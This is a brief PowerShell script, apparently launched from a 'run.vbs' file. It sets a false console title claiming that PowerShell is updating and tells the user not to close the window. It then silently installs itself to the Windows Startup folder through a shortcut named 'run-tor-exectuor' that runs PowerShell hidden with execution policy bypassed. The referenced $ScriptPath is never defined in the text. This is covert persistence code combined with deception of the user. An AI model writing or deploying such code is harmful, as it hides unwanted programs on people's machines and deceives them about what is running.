# for run.vbs

# hide +shortcut
$Host.UI.RawUI.WindowTitle = "PowerShell is Updating... (Don't close!)"

# -----------------------
# Self‑install to Startup (hidden)
# -----------------------

$StartupFolder = [Environment]::GetFolderPath("Startup")
$ShortcutPath = Join-Path $StartupFolder ("run-tor-exectuor" + ".lnk")

if (-not (Test-Path $ShortcutPath)) {
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($ShortcutPath)

    $Shortcut.TargetPath = "powershell.exe"
    $Shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
    $Shortcut.WorkingDirectory = Split-Path $ScriptPath
    $Shortcut.IconLocation = "$env:SystemRoot\System32\shell32.dll,1"

    $Shortcut.Save()
}